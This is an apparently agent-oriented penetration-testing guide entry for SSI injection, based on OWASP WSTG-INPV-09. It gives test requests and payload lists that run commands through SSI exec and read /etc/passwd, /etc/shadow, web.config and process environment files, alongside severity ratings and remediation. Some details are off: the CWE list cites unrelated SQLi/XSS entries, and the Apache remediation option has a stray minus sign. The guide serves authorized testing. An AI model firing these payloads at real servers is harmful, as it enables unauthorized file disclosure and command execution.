---
id: WSTG-INPV-09
title: Testing for SSI Injection
category: Input Validation
severity_range: Medium-High
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection
---

# WSTG-INPV-09: Testing for SSI Injection

## Summary

Server-Side Includes (SSI) Injection occurs when user-supplied input is embedded into web pages that are processed by a web server's SSI engine (commonly Apache with mod_include). SSI directives are special HTML comments that instruct the server to perform actions before sending the page to the client -- such as including files, executing commands, or displaying environment variables. If user input is reflected in pages parsed for SSI directives, an attacker can inject SSI commands to read server files, execute system commands, or access environment variables containing sensitive data.

## Test Objectives

- Identify pages that are processed by the SSI engine (typically .shtml, .stm, .shtm extensions)
- Test if user input is reflected in SSI-parsed pages without sanitization
- Determine if injected SSI directives are executed by the server
- Assess the impact of SSI injection (file read, command execution, information disclosure)

## Prerequisites

- Target web server supports SSI (Apache with mod_include, IIS with SSI enabled, Nginx with SSI module)
- Application has pages with SSI-processed extensions or SSI enabled globally
- Docker pentest container capturing traffic

## Test Steps

### Step 1: Identify SSI-Processed Pages

**CLI Actions:**
1. Use `curl` to identify pages with SSI-related extensions
2. Use `curl` with pattern `\.(shtml|stm|shtm)(\?|$)` to find SSI pages
3. Look for SSI-related headers in responses (e.g., `X-Powered-By` mentioning SSI, or responses containing SSI comment patterns)
4. Check for pages that include dynamic timestamps or server variables that may indicate SSI processing
5. Use `save to manual-review file` for pages identified as SSI-processed

### Step 2: Test for SSI Directive Reflection

**CLI Actions:**
Use `curl` to inject a benign SSI directive into parameters that are reflected in the page:

**Date directive (safe test):**
```
GET /page.shtml?name=<!--%23echo+var="DATE_LOCAL"--> HTTP/1.1
Host: target.com
```

Use `curl --data-urlencode` to encode the SSI directive:
```
GET /page.shtml?name=%3C%21--%23echo+var%3D%22DATE_LOCAL%22--%3E HTTP/1.1
Host: target.com
```

If the response contains the current date/time instead of the SSI directive text, SSI injection is confirmed.

### Step 3: Test for File Inclusion via SSI

**CLI Actions:**
Use `curl` to attempt reading server files:

```
GET /page.shtml?input=<!--%23include+virtual="/etc/passwd"--> HTTP/1.1
Host: target.com
```

```
GET /page.shtml?input=<!--%23include+file="../../etc/passwd"--> HTTP/1.1
Host: target.com
```

Use `curl --data-urlencode` for the payloads as needed. Check if file contents appear in the response.

### Step 4: Test for Command Execution via SSI

**CLI Actions:**
Use `curl` to test OS command execution:

```
GET /page.shtml?input=<!--%23exec+cmd="id"--> HTTP/1.1
Host: target.com
```

```
GET /page.shtml?input=<!--%23exec+cmd="ls+-la"--> HTTP/1.1
Host: target.com
```

```
GET /page.shtml?input=<!--%23exec+cgi="/cgi-bin/test.cgi"--> HTTP/1.1
Host: target.com
```

Check the response for command output. Note that `exec cmd` may be disabled in SSI configuration even if other directives work.

### Step 5: Test for Environment Variable Disclosure

**CLI Actions:**
Use `curl` to enumerate server environment variables:

```
GET /page.shtml?input=<!--%23echo+var="DOCUMENT_ROOT"--> HTTP/1.1
Host: target.com
```

```
GET /page.shtml?input=<!--%23echo+var="SERVER_SOFTWARE"--> HTTP/1.1
Host: target.com
```

```
GET /page.shtml?input=<!--%23echo+var="REMOTE_ADDR"--> HTTP/1.1
Host: target.com
```

```
GET /page.shtml?input=<!--%23printenv+--> HTTP/1.1
Host: target.com
```

### Step 6: Test SSI in POST Parameters and Headers

**CLI Actions:**
SSI injection is not limited to GET parameters. Use `curl` to test POST data and headers:

**POST body:**
```
POST /feedback.shtml HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

comment=<!--%23exec+cmd="id"-->
```

**User-Agent header (if reflected):**
```
GET /page.shtml HTTP/1.1
Host: target.com
User-Agent: <!--#exec cmd="id"-->
```

**Referer header (if reflected):**
```
GET /page.shtml HTTP/1.1
Host: target.com
Referer: <!--#exec cmd="id"-->
```

## Payloads

### SSI Detection Payloads
```
<!--#echo var="DATE_LOCAL"-->
<!--#echo var="DOCUMENT_NAME"-->
<!--#echo var="LAST_MODIFIED"-->
<!--#echo var="SERVER_SOFTWARE"-->
<!--#printenv -->
```

### File Inclusion Payloads
```
<!--#include virtual="/etc/passwd"-->
<!--#include file="../../etc/passwd"-->
<!--#include virtual="/etc/shadow"-->
<!--#include virtual="/web.config"-->
<!--#include virtual="/.htaccess"-->
<!--#include file="../conf/httpd.conf"-->
<!--#include virtual="/proc/self/environ"-->
```

### Command Execution Payloads
```
<!--#exec cmd="id"-->
<!--#exec cmd="ls -la"-->
<!--#exec cmd="cat /etc/passwd"-->
<!--#exec cmd="uname -a"-->
<!--#exec cmd="whoami"-->
<!--#exec cmd="env"-->
<!--#exec cmd="netstat -an"-->
<!--#exec cgi="/cgi-bin/test.cgi"-->
```

### Environment Variable Payloads
```
<!--#echo var="DOCUMENT_ROOT"-->
<!--#echo var="SERVER_SOFTWARE"-->
<!--#echo var="SERVER_NAME"-->
<!--#echo var="REMOTE_ADDR"-->
<!--#echo var="REMOTE_HOST"-->
<!--#echo var="HTTP_USER_AGENT"-->
<!--#echo var="HTTP_REFERER"-->
<!--#echo var="QUERY_STRING"-->
<!--#echo var="PATH"-->
```

### URL-Encoded SSI Payloads
```
%3C%21--%23echo+var%3D%22DATE_LOCAL%22--%3E
%3C%21--%23exec+cmd%3D%22id%22--%3E
%3C%21--%23include+virtual%3D%22%2Fetc%2Fpasswd%22--%3E
%3C!--%23exec%20cmd=%22id%22--%3E
```

### Alternate SSI Syntax Payloads
```
<!--#config errmsg="SSI_INJECTION_TEST"-->
<!--#config sizefmt="bytes"-->
<!--#config timefmt="%Y-%m-%d"-->
<!--#fsize file="index.html"-->
<!--#flastmod file="index.html"-->
```

## Detection Criteria

A finding should be logged when:
- SSI directives injected via user input are executed by the server
- Environment variables or server information is disclosed through SSI echo
- File contents are included in the response via SSI include
- OS commands are executed via SSI exec directives
- SSI error messages reveal directive processing (e.g., custom error messages from `config errmsg`)

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Command execution via SSI exec directive | High |
| Sensitive file read (passwd, config files) via SSI include | High |
| Environment variable disclosure revealing secrets or paths | Medium |
| SSI date/time or server info disclosure only | Low |
| SSI directives reflected but not executed (SSI disabled) | Informational |

## Remediation

- Disable SSI processing if not required by the application
- Disable the `exec` directive in SSI configuration (`Options -IncludesNOEXEC` in Apache)
- Validate and sanitize all user input -- strip or encode SSI directive characters (`<`, `!`, `-`, `#`)
- Avoid reflecting user input in SSI-processed pages
- Restrict SSI processing to specific directories and file types
- Use least-privilege web server user accounts
- Consider migrating from SSI to modern server-side templating (PHP, Node.js, etc.)

## References

- [OWASP Testing Guide - SSI Injection](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection)
- [CWE-97: Improper Neutralization of Server-Side Includes (SSI) Within a Web Page](https://cwe.mitre.org/data/definitions/97.html)
- [Apache mod_include Documentation](https://httpd.apache.org/docs/current/mod/mod_include.html)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V5 Validation — input handling and parser differentials.
- V12 Files and Resources — upload and inclusion controls.

## CWE references

- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-79: Cross-site Scripting

## Rynix tooling

- Primary tools: ``http_probe``, ``rynix_plugin_run` (template-scan)`, ``record_finding``

## Test focus

- Fuzz parameters with encoding variants (URL, Unicode, double-encoding).
- Switch Content-Type to traverse alternate validators.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

